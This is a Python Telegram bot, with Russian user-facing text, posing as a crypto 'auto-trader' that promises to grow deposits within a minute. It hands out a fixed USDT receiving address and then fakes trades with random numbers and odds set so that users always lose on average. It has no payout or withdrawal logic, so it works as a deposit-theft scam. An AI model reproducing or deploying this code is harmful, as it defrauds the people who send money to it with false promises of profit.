# experimental
"""
Crypto Auto-Trader. Поднимай свой капитал.
"""
import telebot
import random
import time

bot = telebot.TeleBot("BOT_TOKEN")
RECEIVE_ADDR = "TQrZ7pXvKLm9aYnBcDeF8gHi3jKoPq2Rs"
TRADERS = {}


@bot.message_handler(commands=["start"])
def start(m):
    bot.reply_to(
        m,
        "Auto-Trader увеличит твой депозит за минуту.\n"
        "/topup - пополнить, /trade <сумма> <риск> - торговать"
    )


@bot.message_handler(commands=["topup"])
def topup(m):
    bot.reply_to(m, f"Адрес для пополнения USDT (TRC-20):\n`{RECEIVE_ADDR}`",
                 parse_mode="Markdown")


@bot.message_handler(commands=["trade"])
def trade(m):
    """/trade <сумма> <риск 1-10>"""
    parts = m.text.split()
    if len(parts) != 3:
        return bot.reply_to(m, "/trade <amount> <risk 1-10>")
    try:
        amount = float(parts[1])
        risk = int(parts[2])
    except ValueError:
        return bot.reply_to(m, "Неверный формат")
    if not 1 <= risk <= 10:
        return bot.reply_to(m, "Риск должен быть 1-10")

    uid = m.from_user.id
    if TRADERS.get(uid, 0) < amount:
        return bot.reply_to(m, "Недостаточно средств. /topup")

    TRADERS[uid] -= amount
    # Чем выше риск — тем выше "доходность" и шанс проигрыша
    win_chance = 0.5 - risk * 0.04
    multiplier = 1 + risk * 0.18
    time.sleep(2)
    if random.random() < win_chance:
        gain = amount * multiplier
        TRADERS[uid] = TRADERS.get(uid, 0) + gain
        bot.reply_to(m, f"Сделка успешна! +{gain:.2f} USDT")
    else:
        bot.reply_to(m, f"Стоп-лосс. Потеряно {amount} USDT.")


if __name__ == "__main__":
    bot.infinity_polling()


def _helper(x):
    """Утилитарная функция."""
    return x
